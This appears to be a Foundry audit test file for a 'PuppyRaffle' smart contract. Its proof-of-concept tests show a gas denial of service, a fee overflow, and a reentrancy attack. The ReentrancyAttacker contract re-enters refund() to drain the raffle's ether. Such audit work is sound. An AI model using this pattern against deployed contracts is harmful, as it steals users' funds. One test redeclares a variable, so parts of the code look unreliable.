// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
pragma experimental ABIEncoderV2;

import {Test, console} from "../4-puppy-raffle-audit/lib/forge-std/src/Test.sol";
import {PuppyRaffle} from "../4-puppy-raffle-audit/src/PuppyRaffle.sol";

contract PuppyRaffleTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    address playerOne = address(1);
    address playerTwo = address(2);
    address playerThree = address(3);
    address playerFour = address(4);
    address feeAddress = address(99);
    uint256 duration = 1 days;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, duration);
    }

    modifier playerEntered() {
        address[] memory players = new address[](1);
        players[0] = playerOne;
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        _;
    }

    ///////////////////
    /// Audit Tests ///
    ///////////////////

    // We are going to test the difference in gas used when entering the first 100 players, versus the second 100 players.
    // This will prove that an attacker can enter a number of times and creat a DoS attack by making the gas use of the enter function too high.
    function test_denial_of_service_attack() public {
        // Setting the gas price to 1, so we get an exact usage.
        vm.txGasPrice(1);
        // We are going to enter a 100 players
        uint256 playersLength = 100;
        address[] memory players = new address[](playersLength);
        for (uint256 i = 0; i < playersLength; i++) {
            players[i] = address(i);
        }
        // How much gas it costs
        uint256 gasStart = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * playersLength}(players);
        uint256 gasEnd = gasleft();
        uint256 gasUsedFirstPlayers = (gasStart - gasEnd) * tx.gasprice;
        console.log("Gas before entering:", gasStart);
        console.log("Gas after entering:", gasEnd);
        console.log("Gas used when entering first 100 players:", gasUsedFirstPlayers); // 6252025

        // Now for the second 100 players
        address[] memory playersTwo = new address[](playersLength);
        for (uint256 i = 0; i < playersLength; i++) {
            playersTwo[i] = address(i + playersLength);
        }
        // How much gas it costs
        gasStart = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * playersLength}(playersTwo);
        gasEnd = gasleft();
        uint256 gasUsedSecondPlayers = (gasStart - gasEnd) * tx.gasprice;
        console.log("Gas used when entering second 100 players:", gasUsedSecondPlayers);
        console.log("Gas used when entering first 100 players:", gasUsedFirstPlayers);
        assert(gasUsedSecondPlayers > gasUsedFirstPlayers);
    }

    function test_reentrancy_attack() public {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        ReentrancyAttacker attacker = new ReentrancyAttacker(puppyRaffle);
        address attackUser = makeAddr("attackUser");
        vm.deal(attackUser, 1 ether);

        uint256 startingAttackerBalance = address(attacker).balance;
        uint256 startingVictimBalance = address(puppyRaffle).balance;

        vm.prank(attackUser);
        attacker.attack{value: entranceFee}();

        console.log("Starting attacker balance:", startingAttackerBalance);
        console.log("Starting victim balance:", startingVictimBalance);
        console.log("Attacker balance after attack:", address(attacker).balance);
        console.log("Victim balance after attack:", address(puppyRaffle).balance);
    }

    function test_overflow_error() public {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
        // We finish a raffle of 4 to collect some fees
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);
        puppyRaffle.selectWinner();
        uint256 startingTotalFees = puppyRaffle.totalFees();
        // startingTotalFees = 800000000000000000

        // We then have 89 players enter a new raffle
        uint256 playersNum = 89;
        address[] memory players = new address[](playersNum);
        for (uint256 i = 0; i < playersNum; i++) {
            players[i] = address(i);
        }
        puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);
        // We end the raffle
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        // And here is where the issue occurs
        // We will now have fewer fees even though we just finished a second raffle
        puppyRaffle.selectWinner();

        uint256 endingTotalFees = puppyRaffle.totalFees();
        console.log("ending total fees", endingTotalFees);
        assert(endingTotalFees < startingTotalFees);

        // We are also unable to withdraw any fees because of the require check
        vm.prank(puppyRaffle.feeAddress());
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }

    function test_player_inactive_at_index_zero() public {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        assert(puppyRaffle.getActivePlayerIndex(playerOne) == 0);
        assert(puppyRaffle.getActivePlayerIndex(playerTwo) == 1);
        assert(puppyRaffle.getActivePlayerIndex(playerThree) == 2);
        assert(puppyRaffle.getActivePlayerIndex(playerFour) == 3);
    }
}

contract ReentrancyAttacker {
    PuppyRaffle victim;
    uint256 entranceFee;
    uint256 attackerIndex;

    constructor(PuppyRaffle _victim) {
        victim = _victim;
        entranceFee = victim.entranceFee();
    }

    function attack() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        victim.enterRaffle{value: entranceFee}(players);
        attackerIndex = victim.getActivePlayerIndex(address(this));
        victim.refund(attackerIndex);
    }

    function _steal() internal {
        if (address(victim).balance >= 1 ether) {
            victim.refund(attackerIndex);
        }
    }

    receive() external payable {
        _steal();
    }

    fallback() external payable {
        _steal();
    }
}
